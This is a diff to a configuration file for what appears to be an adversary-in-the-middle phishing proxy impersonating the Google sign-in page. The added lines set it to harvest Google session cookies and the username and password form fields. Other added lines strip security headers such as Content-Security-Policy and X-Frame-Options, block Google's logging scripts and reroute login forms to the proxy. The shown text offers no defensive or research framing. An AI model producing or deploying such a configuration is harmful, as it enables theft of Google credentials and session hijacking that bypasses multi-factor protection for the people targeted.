@@ -6,16 +6,26 @@ proxy_hosts:
     target: "accounts.google.com"
 auth_urls: ["/signin/v2/identifier", "/ServiceLogin"]
 landing_path: ["/signin/v2/identifier"]
-auth_tokens: []
-credentials: []
+auth_tokens:
+  - {type: "cookie", name: "SID"}
+  - {type: "cookie", name: "HSID"}
+  - {type: "cookie", name: "SSID"}
+  - {type: "cookie", name: "__Secure-3PSID"}
+credentials:
+  - {type: "post_param", name: "identifier", regex: null}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "Email", regex: null}
+  - {type: "post_param", name: "Passwd", regex: null}
 injections: []
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "X-Content-Type-Options"}
 path_rewrites:
   - {pattern: "^/$", replace: "/signin/v2/identifier", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|gtm|/static/", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|gtm|google-analytics|/log|/playlog", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
   - {selector: "form[action*=\"ServiceLogin\"], form[action*=\"signin\"]", action_to: "/session/login"}
 bridges:
